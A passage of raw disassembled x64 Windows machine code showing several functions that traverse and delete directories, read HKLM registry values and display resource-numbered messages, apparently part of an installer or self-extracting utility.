   140001e29:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001e2e:	48 ff 15 53 73 00 00 	rex.W call *0x7353(%rip)        # 0x140009188
   140001e35:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e3a:	44 88 35 8f a9 00 00 	mov    %r14b,0xa98f(%rip)        # 0x14000c7d0
   140001e41:	e9 d3 01 00 00       	jmp    0x140002019
   140001e46:	8b d6                	mov    %esi,%edx
   140001e48:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001e4c:	48 ff 15 bd 73 00 00 	rex.W call *0x73bd(%rip)        # 0x140009210
   140001e53:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e58:	4c 8d 05 49 79 00 00 	lea    0x7949(%rip),%r8        # 0x1400097a8
   140001e5f:	8b d6                	mov    %esi,%edx
   140001e61:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001e65:	e8 3e 5d 00 00       	call   0x140007ba8
   140001e6a:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001e6e:	48 ff 15 a3 73 00 00 	rex.W call *0x73a3(%rip)        # 0x140009218
   140001e75:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e7a:	48 8b f8             	mov    %rax,%rdi
   140001e7d:	48 85 c0             	test   %rax,%rax
   140001e80:	0f 84 cf 00 00 00    	je     0x140001f55
   140001e86:	48 8d 15 2b 79 00 00 	lea    0x792b(%rip),%rdx        # 0x1400097b8
   140001e8d:	48 8b c8             	mov    %rax,%rcx
   140001e90:	48 ff 15 c9 73 00 00 	rex.W call *0x73c9(%rip)        # 0x140009260
   140001e97:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e9c:	48 85 c0             	test   %rax,%rax
   140001e9f:	48 8b cf             	mov    %rdi,%rcx
   140001ea2:	48 8b d8             	mov    %rax,%rbx
   140001ea5:	41 0f 95 c6          	setne  %r14b
   140001ea9:	48 ff 15 d0 73 00 00 	rex.W call *0x73d0(%rip)        # 0x140009280
   140001eb0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001eb5:	48 85 db             	test   %rbx,%rbx
   140001eb8:	0f 84 97 00 00 00    	je     0x140001f55
   140001ebe:	8b d6                	mov    %esi,%edx
   140001ec0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001ec5:	48 ff 15 44 73 00 00 	rex.W call *0x7344(%rip)        # 0x140009210
   140001ecc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ed1:	85 c0                	test   %eax,%eax
   140001ed3:	74 13                	je     0x140001ee8
   140001ed5:	4c 8d 05 24 78 00 00 	lea    0x7824(%rip),%r8        # 0x140009700
   140001edc:	8b d6                	mov    %esi,%edx
   140001ede:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001ee3:	e8 c0 5c 00 00       	call   0x140007ba8
   140001ee8:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140001eec:	4c 8d 2d 1d b7 00 00 	lea    0xb71d(%rip),%r13        # 0x14000d610
   140001ef3:	48 8b c3             	mov    %rbx,%rax
   140001ef6:	48 ff c0             	inc    %rax
   140001ef9:	42 80 3c 28 00       	cmpb   $0x0,(%rax,%r13,1)
   140001efe:	75 f6                	jne    0x140001ef6
   140001f00:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001f05:	48 8b cb             	mov    %rbx,%rcx
   140001f08:	48 ff c1             	inc    %rcx
   140001f0b:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   140001f0f:	75 f7                	jne    0x140001f08
   140001f11:	48 83 c0 50          	add    $0x50,%rax
   140001f15:	48 03 c1             	add    %rcx,%rax
   140001f18:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001f1d:	8b d0                	mov    %eax,%edx
   140001f1f:	8b f0                	mov    %eax,%esi
   140001f21:	48 ff 15 a0 74 00 00 	rex.W call *0x74a0(%rip)        # 0x1400093c8
   140001f28:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f2d:	48 8b f8             	mov    %rax,%rdi
   140001f30:	48 85 c0             	test   %rax,%rax
   140001f33:	75 59                	jne    0x140001f8e
   140001f35:	21 44 24 28          	and    %eax,0x28(%rsp)
   140001f39:	45 33 c9             	xor    %r9d,%r9d
   140001f3c:	45 33 c0             	xor    %r8d,%r8d
   140001f3f:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140001f46:	00 
   140001f47:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140001f4c:	33 c9                	xor    %ecx,%ecx
   140001f4e:	e8 79 2e 00 00       	call   0x140004dcc
   140001f53:	eb 23                	jmp    0x140001f78
   140001f55:	48 8b 0d 14 bf 00 00 	mov    0xbf14(%rip),%rcx        # 0x14000de70
   140001f5c:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001f61:	44 8b c6             	mov    %esi,%r8d
   140001f64:	48 ff 15 85 74 00 00 	rex.W call *0x7485(%rip)        # 0x1400093f0
   140001f6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f70:	85 c0                	test   %eax,%eax
   140001f72:	0f 85 70 ff ff ff    	jne    0x140001ee8
   140001f78:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001f7d:	48 ff 15 04 72 00 00 	rex.W call *0x7204(%rip)        # 0x140009188
   140001f84:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f89:	e9 8b 00 00 00       	jmp    0x140002019
   140001f8e:	41 8b c6             	mov    %r14d,%eax
   140001f91:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001f96:	83 f0 01             	xor    $0x1,%eax
   140001f99:	4c 8d 05 b0 a1 00 00 	lea    0xa1b0(%rip),%r8        # 0x14000c150
   140001fa0:	89 05 7a a8 00 00    	mov    %eax,0xa87a(%rip)        # 0x14000c820
   140001fa6:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140001fab:	45 85 f6             	test   %r14d,%r14d
   140001fae:	48 8d 05 a3 a0 00 00 	lea    0xa0a3(%rip),%rax        # 0x14000c058
   140001fb5:	48 8b d6             	mov    %rsi,%rdx
   140001fb8:	48 8b cf             	mov    %rdi,%rcx
   140001fbb:	4c 0f 45 c0          	cmovne %rax,%r8
   140001fbf:	e8 88 f1 ff ff       	call   0x14000114c
   140001fc4:	48 ff c3             	inc    %rbx
   140001fc7:	80 3c 1f 00          	cmpb   $0x0,(%rdi,%rbx,1)
   140001fcb:	75 f7                	jne    0x140001fc4
   140001fcd:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001fd2:	48 8d 15 f7 a7 00 00 	lea    0xa7f7(%rip),%rdx        # 0x14000c7d0
   140001fd9:	ff c3                	inc    %ebx
   140001fdb:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140001fe1:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001fe5:	45 33 c0             	xor    %r8d,%r8d
   140001fe8:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001fed:	48 ff 15 64 71 00 00 	rex.W call *0x7164(%rip)        # 0x140009158
   140001ff4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ff9:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001ffe:	48 ff 15 83 71 00 00 	rex.W call *0x7183(%rip)        # 0x140009188
   140002005:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000200a:	48 8b cf             	mov    %rdi,%rcx
   14000200d:	48 ff 15 5c 72 00 00 	rex.W call *0x725c(%rip)        # 0x140009270
   140002014:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002019:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140002020:	48 33 cc             	xor    %rsp,%rcx
   140002023:	e8 48 64 00 00       	call   0x140008470
   140002028:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   14000202f:	00 
   140002030:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140002034:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140002038:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   14000203c:	49 8b e3             	mov    %r11,%rsp
   14000203f:	41 5e                	pop    %r14
   140002041:	41 5d                	pop    %r13
   140002043:	5d                   	pop    %rbp
   140002044:	c3                   	ret
   140002045:	cc                   	int3
   140002046:	cc                   	int3
   140002047:	cc                   	int3
   140002048:	cc                   	int3
   140002049:	cc                   	int3
   14000204a:	cc                   	int3
   14000204b:	cc                   	int3
   14000204c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002051:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002056:	55                   	push   %rbp
   140002057:	57                   	push   %rdi
   140002058:	41 57                	push   %r15
   14000205a:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   140002061:	ff 
   140002062:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   140002069:	48 8b 05 98 9f 00 00 	mov    0x9f98(%rip),%rax        # 0x14000c008
   140002070:	48 33 c4             	xor    %rsp,%rax
   140002073:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   14000207a:	80 39 00             	cmpb   $0x0,(%rcx)
   14000207d:	48 8b f9             	mov    %rcx,%rdi
   140002080:	0f 84 8d 01 00 00    	je     0x140002213
   140002086:	41 bf 04 01 00 00    	mov    $0x104,%r15d
   14000208c:	48 8d 45 60          	lea    0x60(%rbp),%rax
   140002090:	48 8b df             	mov    %rdi,%rbx
   140002093:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002097:	41 8b d7             	mov    %r15d,%edx
   14000209a:	48 2b d8             	sub    %rax,%rbx
   14000209d:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400020a4:	48 85 c0             	test   %rax,%rax
   1400020a7:	74 12                	je     0x1400020bb
   1400020a9:	8a 04 0b             	mov    (%rbx,%rcx,1),%al
   1400020ac:	84 c0                	test   %al,%al
   1400020ae:	74 0b                	je     0x1400020bb
   1400020b0:	88 01                	mov    %al,(%rcx)
   1400020b2:	48 ff c1             	inc    %rcx
   1400020b5:	48 83 ea 01          	sub    $0x1,%rdx
   1400020b9:	75 e2                	jne    0x14000209d
   1400020bb:	48 85 d2             	test   %rdx,%rdx
   1400020be:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400020c2:	4c 8d 05 ff 76 00 00 	lea    0x76ff(%rip),%r8        # 0x1400097c8
   1400020c9:	49 8b d7             	mov    %r15,%rdx
   1400020cc:	48 0f 45 c1          	cmovne %rcx,%rax
   1400020d0:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400020d4:	c6 00 00             	movb   $0x0,(%rax)
   1400020d7:	e8 a8 ef ff ff       	call   0x140001084
   1400020dc:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400020e1:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400020e5:	48 ff 15 fc 72 00 00 	rex.W call *0x72fc(%rip)        # 0x1400093e8
   1400020ec:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400020f1:	48 8b f0             	mov    %rax,%rsi
   1400020f4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400020f8:	0f 84 15 01 00 00    	je     0x140002213
   1400020fe:	4d 8b c7             	mov    %r15,%r8
   140002101:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140002105:	49 8d 88 fa fe ff 7f 	lea    0x7ffffefa(%r8),%rcx
   14000210c:	48 85 c9             	test   %rcx,%rcx
   14000210f:	74 12                	je     0x140002123
   140002111:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   140002114:	84 c0                	test   %al,%al
   140002116:	74 0b                	je     0x140002123
   140002118:	88 02                	mov    %al,(%rdx)
   14000211a:	48 ff c2             	inc    %rdx
   14000211d:	49 83 e8 01          	sub    $0x1,%r8
   140002121:	75 e2                	jne    0x140002105
   140002123:	4d 85 c0             	test   %r8,%r8
   140002126:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000212a:	48 0f 45 c2          	cmovne %rdx,%rax
   14000212e:	f6 44 24 20 10       	testb  $0x10,0x20(%rsp)
   140002133:	c6 00 00             	movb   $0x0,(%rax)
   140002136:	74 6b                	je     0x1400021a3
   140002138:	48 8d 15 8d 76 00 00 	lea    0x768d(%rip),%rdx        # 0x1400097cc
   14000213f:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140002144:	48 ff 15 85 72 00 00 	rex.W call *0x7285(%rip)        # 0x1400093d0
   14000214b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002150:	85 c0                	test   %eax,%eax
   140002152:	0f 84 81 00 00 00    	je     0x1400021d9
   140002158:	48 8d 15 71 76 00 00 	lea    0x7671(%rip),%rdx        # 0x1400097d0
   14000215f:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140002164:	48 ff 15 65 72 00 00 	rex.W call *0x7265(%rip)        # 0x1400093d0
   14000216b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002170:	85 c0                	test   %eax,%eax
   140002172:	74 65                	je     0x1400021d9
   140002174:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   140002179:	49 8b d7             	mov    %r15,%rdx
   14000217c:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002180:	e8 ff ee ff ff       	call   0x140001084
   140002185:	4c 8d 05 74 75 00 00 	lea    0x7574(%rip),%r8        # 0x140009700
   14000218c:	41 8b d7             	mov    %r15d,%edx
   14000218f:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140002193:	e8 10 5a 00 00       	call   0x140007ba8
   140002198:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   14000219c:	e8 ab fe ff ff       	call   0x14000204c
   1400021a1:	eb 36                	jmp    0x1400021d9
   1400021a3:	4c 8d 44 24 4c       	lea    0x4c(%rsp),%r8
   1400021a8:	49 8b d7             	mov    %r15,%rdx
   1400021ab:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400021af:	e8 d0 ee ff ff       	call   0x140001084
   1400021b4:	ba 80 00 00 00       	mov    $0x80,%edx
   1400021b9:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400021bd:	48 ff 15 94 70 00 00 	rex.W call *0x7094(%rip)        # 0x140009258
   1400021c4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021c9:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400021cd:	48 ff 15 4c 70 00 00 	rex.W call *0x704c(%rip)        # 0x140009220
   1400021d4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021d9:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400021de:	48 8b ce             	mov    %rsi,%rcx
   1400021e1:	48 ff 15 f0 71 00 00 	rex.W call *0x71f0(%rip)        # 0x1400093d8
   1400021e8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400021ed:	85 c0                	test   %eax,%eax
   1400021ef:	0f 85 09 ff ff ff    	jne    0x1400020fe
   1400021f5:	48 8b ce             	mov    %rsi,%rcx
   1400021f8:	48 ff 15 81 72 00 00 	rex.W call *0x7281(%rip)        # 0x140009480
   1400021ff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002204:	48 8b cf             	mov    %rdi,%rcx
   140002207:	48 ff 15 6a 70 00 00 	rex.W call *0x706a(%rip)        # 0x140009278
   14000220e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002213:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   14000221a:	48 33 cc             	xor    %rsp,%rcx
   14000221d:	e8 4e 62 00 00       	call   0x140008470
   140002222:	4c 8d 9c 24 80 02 00 	lea    0x280(%rsp),%r11
   140002229:	00 
   14000222a:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000222e:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140002232:	49 8b e3             	mov    %r11,%rsp
   140002235:	41 5f                	pop    %r15
   140002237:	5f                   	pop    %rdi
   140002238:	5d                   	pop    %rbp
   140002239:	c3                   	ret
   14000223a:	cc                   	int3
   14000223b:	cc                   	int3
   14000223c:	cc                   	int3
   14000223d:	cc                   	int3
   14000223e:	cc                   	int3
   14000223f:	cc                   	int3
   140002240:	cc                   	int3
   140002241:	cc                   	int3
   140002242:	cc                   	int3
   140002243:	cc                   	int3
   140002244:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002249:	57                   	push   %rdi
   14000224a:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140002251:	48 8b 05 b0 9d 00 00 	mov    0x9db0(%rip),%rax        # 0x14000c008
   140002258:	48 33 c4             	xor    %rsp,%rax
   14000225b:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140002262:	00 
   140002263:	bf 04 01 00 00       	mov    $0x104,%edi
   140002268:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000226d:	8b d7                	mov    %edi,%edx
   14000226f:	33 db                	xor    %ebx,%ebx
   140002271:	48 ff 15 d8 6f 00 00 	rex.W call *0x6fd8(%rip)        # 0x140009250
   140002278:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000227d:	85 c0                	test   %eax,%eax
   14000227f:	74 6a                	je     0x1400022eb
   140002281:	4c 8d 05 50 75 00 00 	lea    0x7550(%rip),%r8        # 0x1400097d8
   140002288:	8b d7                	mov    %edi,%edx
   14000228a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000228f:	e8 14 59 00 00       	call   0x140007ba8
   140002294:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   140002299:	45 33 c0             	xor    %r8d,%r8d
   14000229c:	33 d2                	xor    %edx,%edx
   14000229e:	33 c9                	xor    %ecx,%ecx
   1400022a0:	48 ff 15 99 6f 00 00 	rex.W call *0x6f99(%rip)        # 0x140009240
   1400022a7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022ac:	8d 53 40             	lea    0x40(%rbx),%edx
   1400022af:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400022b4:	48 ff 15 2d 6f 00 00 	rex.W call *0x6f2d(%rip)        # 0x1400091e8
   1400022bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022c0:	8b f8                	mov    %eax,%edi
   1400022c2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400022c5:	74 24                	je     0x1400022eb
   1400022c7:	33 d2                	xor    %edx,%edx
   1400022c9:	44 8d 43 02          	lea    0x2(%rbx),%r8d
   1400022cd:	8b c8                	mov    %eax,%ecx
   1400022cf:	48 ff 15 1a 6f 00 00 	rex.W call *0x6f1a(%rip)        # 0x1400091f0
   1400022d6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022db:	8b cf                	mov    %edi,%ecx
   1400022dd:	8b d8                	mov    %eax,%ebx
   1400022df:	48 ff 15 a2 6f 00 00 	rex.W call *0x6fa2(%rip)        # 0x140009288
   1400022e6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400022eb:	8b c3                	mov    %ebx,%eax
   1400022ed:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   1400022f4:	00 
   1400022f5:	48 33 cc             	xor    %rsp,%rcx
   1400022f8:	e8 73 61 00 00       	call   0x140008470
   1400022fd:	48 8b 9c 24 50 01 00 	mov    0x150(%rsp),%rbx
   140002304:	00 
   140002305:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   14000230c:	5f                   	pop    %rdi
   14000230d:	c3                   	ret
   14000230e:	cc                   	int3
   14000230f:	cc                   	int3
   140002310:	cc                   	int3
   140002311:	cc                   	int3
   140002312:	cc                   	int3
   140002313:	cc                   	int3
   140002314:	cc                   	int3
   140002315:	cc                   	int3
   140002316:	cc                   	int3
   140002317:	cc                   	int3
   140002318:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000231d:	55                   	push   %rbp
   14000231e:	48 8b ec             	mov    %rsp,%rbp
   140002321:	48 83 ec 60          	sub    $0x60,%rsp
   140002325:	33 db                	xor    %ebx,%ebx
   140002327:	66 85 c9             	test   %cx,%cx
   14000232a:	0f 84 17 01 00 00    	je     0x140002447
   140002330:	66 83 f9 01          	cmp    $0x1,%cx
   140002334:	0f 84 91 00 00 00    	je     0x1400023cb
   14000233a:	0f 86 0e 01 00 00    	jbe    0x14000244e
   140002340:	66 83 f9 03          	cmp    $0x3,%cx
   140002344:	0f 87 04 01 00 00    	ja     0x14000244e
   14000234a:	48 8d 45 18          	lea    0x18(%rbp),%rax
   14000234e:	89 5d 10             	mov    %ebx,0x10(%rbp)
   140002351:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140002357:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000235c:	45 33 c0             	xor    %r8d,%r8d
   14000235f:	48 8d 15 ba 9c 00 00 	lea    0x9cba(%rip),%rdx        # 0x14000c020
   140002366:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000236d:	48 ff 15 c4 6d 00 00 	rex.W call *0x6dc4(%rip)        # 0x140009138
   140002374:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002379:	85 c0                	test   %eax,%eax
   14000237b:	75 46                	jne    0x1400023c3
   14000237d:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140002381:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140002385:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000238a:	48 8d 15 77 9d 00 00 	lea    0x9d77(%rip),%rdx        # 0x14000c108
   140002391:	45 33 c9             	xor    %r9d,%r9d
   140002394:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002399:	45 33 c0             	xor    %r8d,%r8d
   14000239c:	48 ff 15 d5 6d 00 00 	rex.W call *0x6dd5(%rip)        # 0x140009178
   1400023a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023a8:	8b 4d 10             	mov    0x10(%rbp),%ecx
   1400023ab:	85 c0                	test   %eax,%eax
   1400023ad:	0f 45 cb             	cmovne %ebx,%ecx
   1400023b0:	89 4d 10             	mov    %ecx,0x10(%rbp)
   1400023b3:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   1400023b7:	48 ff 15 ca 6d 00 00 	rex.W call *0x6dca(%rip)        # 0x140009188
   1400023be:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023c3:	8b 5d 10             	mov    0x10(%rbp),%ebx
   1400023c6:	e9 83 00 00 00       	jmp    0x14000244e
   1400023cb:	48 8d 45 18          	lea    0x18(%rbp),%rax
   1400023cf:	89 5d 10             	mov    %ebx,0x10(%rbp)
   1400023d2:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   1400023d8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400023dd:	45 33 c0             	xor    %r8d,%r8d
   1400023e0:	48 8d 15 79 9d 00 00 	lea    0x9d79(%rip),%rdx        # 0x14000c160
   1400023e7:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   1400023ee:	48 ff 15 43 6d 00 00 	rex.W call *0x6d43(%rip)        # 0x140009138
   1400023f5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023fa:	85 c0                	test   %eax,%eax
   1400023fc:	75 c5                	jne    0x1400023c3
   1400023fe:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   140002402:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140002406:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   14000240b:	45 33 c9             	xor    %r9d,%r9d
   14000240e:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002413:	45 33 c0             	xor    %r8d,%r8d
   140002416:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000241b:	33 d2                	xor    %edx,%edx
   14000241d:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140002422:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002427:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000242c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140002431:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002436:	48 ff 15 03 6d 00 00 	rex.W call *0x6d03(%rip)        # 0x140009140
   14000243d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002442:	e9 61 ff ff ff       	jmp    0x1400023a8
   140002447:	e8 f8 fd ff ff       	call   0x140002244
   14000244c:	8b d8                	mov    %eax,%ebx
   14000244e:	8b c3                	mov    %ebx,%eax
   140002450:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002457:	00 
   140002458:	48 83 c4 60          	add    $0x60,%rsp
   14000245c:	5d                   	pop    %rbp
   14000245d:	c3                   	ret
   14000245e:	cc                   	int3
   14000245f:	cc                   	int3
   140002460:	cc                   	int3
   140002461:	cc                   	int3
   140002462:	cc                   	int3
   140002463:	cc                   	int3
   140002464:	cc                   	int3
   140002465:	cc                   	int3
   140002466:	cc                   	int3
   140002467:	cc                   	int3
   140002468:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000246d:	57                   	push   %rdi
   14000246e:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140002475:	48 8b 05 8c 9b 00 00 	mov    0x9b8c(%rip),%rax        # 0x14000c008
   14000247c:	48 33 c4             	xor    %rsp,%rax
   14000247f:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   140002486:	00 
   140002487:	48 8b f9             	mov    %rcx,%rdi
   14000248a:	ba 04 01 00 00       	mov    $0x104,%edx
   14000248f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002494:	48 ff 15 b5 6d 00 00 	rex.W call *0x6db5(%rip)        # 0x140009250
   14000249b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024a0:	33 db                	xor    %ebx,%ebx
   1400024a2:	85 c0                	test   %eax,%eax
   1400024a4:	75 1e                	jne    0x1400024c4
   1400024a6:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400024aa:	45 33 c9             	xor    %r9d,%r9d
   1400024ad:	45 33 c0             	xor    %r8d,%r8d
   1400024b0:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400024b7:	00 
   1400024b8:	ba f0 04 00 00       	mov    $0x4f0,%edx
   1400024bd:	33 c9                	xor    %ecx,%ecx
   1400024bf:	e8 08 29 00 00       	call   0x140004dcc
   1400024c4:	8a 4c 24 30          	mov    0x30(%rsp),%cl
   1400024c8:	38 0f                	cmp    %cl,(%rdi)
   1400024ca:	0f 94 c3             	sete   %bl
   1400024cd:	8b c3                	mov    %ebx,%eax
   1400024cf:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   1400024d6:	00 
   1400024d7:	48 33 cc             	xor    %rsp,%rcx
   1400024da:	e8 91 5f 00 00       	call   0x140008470
   1400024df:	48 8b 9c 24 60 01 00 	mov    0x160(%rsp),%rbx
   1400024e6:	00 
   1400024e7:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   1400024ee:	5f                   	pop    %rdi
   1400024ef:	c3                   	ret
   1400024f0:	cc                   	int3
   1400024f1:	cc                   	int3
   1400024f2:	cc                   	int3
   1400024f3:	cc                   	int3
   1400024f4:	cc                   	int3
   1400024f5:	cc                   	int3
   1400024f6:	cc                   	int3
   1400024f7:	cc                   	int3
   1400024f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400024fd:	57                   	push   %rdi
   1400024fe:	48 83 ec 50          	sub    $0x50,%rsp
   140002502:	48 8b 05 ff 9a 00 00 	mov    0x9aff(%rip),%rax        # 0x14000c008
   140002509:	48 33 c4             	xor    %rsp,%rax
   14000250c:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002511:	33 db                	xor    %ebx,%ebx
   140002513:	c7 05 27 b0 00 00 70 	movl   $0x70,0xb027(%rip)        # 0x14000d544
   14000251a:	00 00 00 
   14000251d:	49 8b f9             	mov    %r9,%rdi
   140002520:	83 f9 01             	cmp    $0x1,%ecx
   140002523:	75 3d                	jne    0x140002562
   140002525:	45 8d 0c 10          	lea    (%r8,%rdx,1),%r9d
   140002529:	4c 8d 05 b4 72 00 00 	lea    0x72b4(%rip),%r8        # 0x1400097e4
   140002530:	8d 53 0a             	lea    0xa(%rbx),%edx
   140002533:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002538:	e8 0f ec ff ff       	call   0x14000114c
   14000253d:	21 5c 24 28          	and    %ebx,0x28(%rsp)
   140002541:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002546:	45 33 c9             	xor    %r9d,%r9d
   140002549:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002550:	00 
   140002551:	ba fa 04 00 00       	mov    $0x4fa,%edx
   140002556:	33 c9                	xor    %ecx,%ecx
   140002558:	e8 6f 28 00 00       	call   0x140004dcc
   14000255d:	e9 98 00 00 00       	jmp    0x1400025fa
   140002562:	83 f9 04             	cmp    $0x4,%ecx
   140002565:	75 44                	jne    0x1400025ab
   140002567:	45 8d 0c 10          	lea    (%r8,%rdx,1),%r9d
   14000256b:	8d 51 06             	lea    0x6(%rcx),%edx
   14000256e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002573:	4c 8d 05 6a 72 00 00 	lea    0x726a(%rip),%r8        # 0x1400097e4
